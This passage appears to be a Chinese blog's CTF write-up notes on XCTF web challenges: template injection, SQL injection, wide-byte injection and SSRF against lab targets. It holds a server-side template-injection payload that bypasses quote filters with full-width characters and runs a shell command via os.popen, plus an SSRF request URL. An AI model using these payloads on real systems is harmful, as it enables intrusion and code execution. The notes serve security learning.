+<p><strong>联想到字符规范，去找规范后能变成括号的字符：︷︸</strong>，<a target="_blank" rel="noopener" href="http://www.fhdq.net/">符号大全-特殊符号-特殊符号大全 (fhdq.net)</a></p>
+<p>用算术运算测试，得到结果<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928135203081.png" alt="image-20230928135203081"></p>
+<p>绕过引号过滤：使用全角标点</p>
+<p>查看根目录下的flag，payload<code>str=︷︷a.__init__.__globals__.__builtins__.eval(＂__import__(＇os＇).popen(＇cat /flag＇).read()＂)︸︸</code><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928143304510.png" alt="image-20230928143304510"></p>
+<p>总结：模板注入</p>
+<h2 id="Background-Management-System"><a href="#Background-Management-System" class="headerlink" title="*Background_Management_System"></a>*Background_Management_System</h2><p>发起请求时端口会被重定向到62126，需要抓包修改，不然一直访问失败。（或许需要clear cache一下？</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928145730485.png" alt="image-20230928145730485"></p>
+<p>提示：数据库，有过滤（猜一个二次注入</p>
+<p>登录登不进，确实过滤了很多字符，应该是双引号闭合。先注册一个账号（admin已被注册），注册后成功登录后台，用户个人中心有提示：看来需要登录admin<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928150651219.png" alt="image-20230928150651219"></p>
+<p>cookie中有username值，记一下，可能有用。</p>
+<p>修改密码，输入单引号get提示，看来有注入！<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928151329085.png" alt="image-20230928151329085"></p>
+<p>并没有判断旧密码是否正确</p>
+<p><strong>目录扫描，不一定是网站根目录开始，根据url的规律，猜测后台的根目录在&#x2F;xinan&#x2F;public&#x2F;。（但我并没有扫出来）</strong></p>
+<p>未完待续……</p>
+<p>总结：目录扫描、代码审计、二次注入、ssrf、gopher</p>
+<h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h2><p>题目提示：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</p>
+<p>也只有云平台报表中心能点开，有一个id参数，抓包会发现还有一个page参数的请求。</p>
+<p><strong>爆破id</strong>（啊这……）。在burp-intruder-payload选择数值。</p>
+<h2 id="ics-07"><a href="#ics-07" class="headerlink" title="*ics-07"></a>*ics-07</h2><p>题目提示：工控云管理系统项目管理页面解析漏洞</p>
+<p>点击项目管理页面会发起参数为page&#x3D;flag.php的请求</p>
+<p>点击view-source审计源码：</p>
+<ol>
+<li>page参数不能控制include的内容</li>
+<li>如果是admin用户，可以上传文件</li>
+<li>数据库查询部分要求：<ol>
+<li>id不为1，且最后一位是9</li>
+<li>数据库为cetc007，查询的表为user，列为id和user</li>
+<li>mysql_real_escape_string，转义特殊字符,<strong>宽字节注入</strong></li>
+<li>单引号闭合</li>
+</ol>
+</li>
+</ol>
+<p>暂时连不上数据库啊，未完待续……</p>
+<h2 id="ics-02"><a href="#ics-02" class="headerlink" title="*ics-02"></a>*ics-02</h2><p>题目提示：文档中心页面</p>
+<p>paper处的URL提示有SSRF，温馨提示：文档里可以找到有效信息。下载下来是个download.php，但是通过内容or报错信息可知应该是个pdf<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928210231457.png" alt="image-20230928210231457"></p>
+<p>form表单有action：secure&#x2F;default.php，404</p>
+<p>改download.php为pdf后缀，打开查看详细内容。突然想到了pdf隐写？</p>
+<p>全是SSRF漏洞的讲解，找不到东西。</p>
+<p><strong>啊啊啊啊啊啊啊啊又是忘记目录扫描了</strong>：downloads和secret</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928211959474.png" alt="image-20230928211959474"></p>
+<p>secret目录下存在secret.php和secret_debug.php。</p>
+<p>secret.php的表单请求中有个隐藏参数s，爆破s的值，s&#x3D;3时出现新页面：<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928213933208.png" alt="image-20230928213933208"></p>
+<p>但是没找着有什么用哇……</p>
+<p>再看看secret_debug.php，限制IP，想到了前面的ssrf，还是不知道咋用……</p>
+<p><strong><code>dl=http://127.0.0.1/secure/secure_debug.php?s=3&amp;txtfirst_name=1&amp;txtmiddle_name=2&amp;txtLast_name=3&amp;txtname_suffix=4&amp;txtdob=5&amp;txtdl_nmbr=6&amp;txtRetypeDL=7&amp;btnContinue2=Continue&amp;</code></strong></p>
+<p>这里的思路应该时secure_debug.php执行流程与secure.php一样,s&#x3D;3时是一个注册的操作。由于&amp;在get传参时属于特殊字符，需要url编码一下。为了防止后端下载拼接.pdf后缀时影响最后一个参数，在末尾添加一个&amp;符号。至于127.0.0.1的端口，盲猜80了。</p>
+<p>执行成功，但是攻防世界的数据库好像挂了<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928221227410.png" alt="image-20230928221227410"></p>
+<h2 id="bug"><a href="#bug" class="headerlink" title="*bug"></a>*bug</h2><p>首先要登录，随便尝试一下得到提示’User does not exist’，看起来可以用户枚举。注入不行。</p>
+<p>看看注册，注册成功，但是登录还是显示用户不存在</p>
+<p>看看忘记密码，一直显示something wrong，step参数好像可以控制重置密码的流程</p>
+<p>终于记得目录扫描，有template&#x2F;目录和admin.php</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20230928222909493.png" alt="image-20230928222909493"></p>
+<p>admin.php：Access Denied!应该需要登录</p>
+<p>攻防世界的数据库可能有问题了，换个靶场……</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/07/14/programming/Java/JDBC/" rel="prev" title="JDBC">
+      <i class="fa fa-chevron-left"></i> JDBC
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/07/22/web%E5%AE%89%E5%85%A8/DVWA/" rel="next" title="DVWA">
+      DVWA <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2023"><span class="nav-number">1.</span> <span class="nav-text">2023</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#easytornado"><span class="nav-number">1.1.</span> <span class="nav-text">easytornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Zhuanxv"><span class="nav-number">1.2.</span> <span class="nav-text">*Zhuanxv</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezsqli"><span class="nav-number">1.3.</span> <span class="nav-text">*ezsqli</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#filemanager"><span class="nav-number">1.4.</span> <span class="nav-text">filemanager</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-php-include"><span class="nav-number">1.5.</span> <span class="nav-text">Web_php_include</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#warmup"><span class="nav-number">1.6.</span> <span class="nav-text">warmup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cat"><span class="nav-number">1.7.</span> <span class="nav-text">Cat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unserialize3"><span class="nav-number">1.8.</span> <span class="nav-text">unserialize3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#supersqli"><span class="nav-number">1.9.</span> <span class="nav-text">supersqli</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Triangle"><span class="nav-number">1.10.</span> <span class="nav-text">*Triangle</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF-Me"><span class="nav-number">1.11.</span> <span class="nav-text">SSRF Me</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ics-05"><span class="nav-number">1.12.</span> <span class="nav-text">ics-05</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BadProgrammer"><span class="nav-number">1.13.</span> <span class="nav-text">BadProgrammer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NewCenter"><span class="nav-number">1.14.</span> <span class="nav-text">NewCenter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xff-referer"><span class="nav-number">1.15.</span> <span class="nav-text">xff_referer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#weak-auth"><span class="nav-number">1.16.</span> <span class="nav-text">weak_auth</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wzsc-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">1.17.</span> <span class="nav-text">*wzsc_文件上传</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#file-include"><span class="nav-number">1.18.</span> <span class="nav-text">-file_include</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-rce"><span class="nav-number">1.19.</span> <span class="nav-text">php_rce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-curl"><span class="nav-number">1.20.</span> <span class="nav-text">-ez_curl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-php-unserialize"><span class="nav-number">1.21.</span> <span class="nav-text">Web_php_unserialize</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FlatScience"><span class="nav-number">1.22.</span> <span class="nav-text">-FlatScience</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-web"><span class="nav-number">1.23.</span> <span class="nav-text">easy_web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Background-Management-System"><span class="nav-number">1.24.</span> <span class="nav-text">*Background_Management_System</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ics-06"><span class="nav-number">1.25.</span> <span class="nav-text">ics-06</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ics-07"><span class="nav-number">1.26.</span> <span class="nav-text">*ics-07</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ics-02"><span class="nav-number">1.27.</span> <span class="nav-text">*ics-02</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bug"><span class="nav-number">1.28.</span> <span class="nav-text">*bug</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sean"
+      src="/images/banner.jpg">
+  <p class="site-author-name" itemprop="name">Sean</p>
+  <div class="site-description" itemprop="description">热爱可抵岁月漫长</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">90</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Seanxz401" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Seanxz401" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sean</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
